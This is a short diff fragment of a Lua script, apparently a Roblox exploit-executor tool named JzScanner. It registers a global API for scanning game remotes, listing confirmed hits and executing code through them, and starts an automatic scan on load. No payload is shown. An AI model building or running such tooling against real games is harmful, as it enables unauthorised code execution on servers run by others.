+	local genv = getgenv and getgenv() or _G
+	genv.JzScanner = {
+		Version = VERSION,
+		Config = CONFIG,
+		State = State,
+		Scan = function()
+			if not State.scanning then
+				task.spawn(runScan)
+			end
+		end,
+		GetConfirmed = function()
+			local out = {}
+			for _, m in ipairs(State.results) do
+				if m.hits > 0 then
+					table.insert(out, m.remote)
+				end
+			end
+			return out
+		end,
+		Execute = executeCurrent,
+		Broadcast = hintBroadcast,
+		Log = log,
+		Gui = parentGui,
+	}
+end)
+
+if State.settings.autoScan then
+	task.delay(2, function()
+		if not State.destroyed then
+			log("INFO", "auto-scan starting...")
+			task.spawn(runScan)
+		end
+	end)
+end
+
+print("⚡ JzScanner " .. VERSION .. " loaded! Press INSERT to toggle.")
